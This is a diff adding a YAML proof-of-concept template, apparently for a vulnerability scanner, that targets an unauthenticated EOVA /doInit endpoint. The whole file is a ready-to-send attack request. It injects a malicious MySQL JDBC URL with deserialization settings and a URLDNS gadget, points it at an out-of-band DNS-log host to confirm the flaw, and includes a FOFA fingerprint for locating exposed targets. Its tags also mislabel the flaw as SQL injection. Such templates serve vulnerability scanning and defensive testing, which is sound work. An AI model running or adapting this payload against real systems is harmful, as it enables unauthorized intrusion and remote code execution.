@@ -1,0 +1,22 @@
+id: poc-yaml-eova-doinit-jdbc-rce
+info:
+  name: EOVA未授权doInit接口存在反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - sql-injection
+  finger: eova
+  fofa: icon_hash="-1699356011"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /doInit
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ip={{.reverseDomain}}:3333%2Ftest%3FautoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=URLDNS%26Yu9=Yu9%23&port=&username=root&password=123456
+  expression: 'reverse.Verify()
+
+    '
+transport: http
